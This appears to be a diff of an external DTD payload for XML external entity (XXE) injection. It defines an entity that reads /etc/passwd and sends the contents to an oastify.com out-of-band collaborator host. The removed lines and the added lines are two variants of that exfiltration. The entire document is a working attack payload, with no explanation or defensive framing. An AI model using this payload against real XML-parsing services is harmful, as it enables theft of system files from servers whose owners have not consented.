@@ -1,4 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://f6mwjk5rf0sovkqoipa08np7syypmhd52.oastify.com/?data=%file;'>">
-%wrapper;
-%send;
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://s4x9hx34ddq1txo1g28d60nkqbw2kufi4.oastify.com/?%file;'>">
+%all;
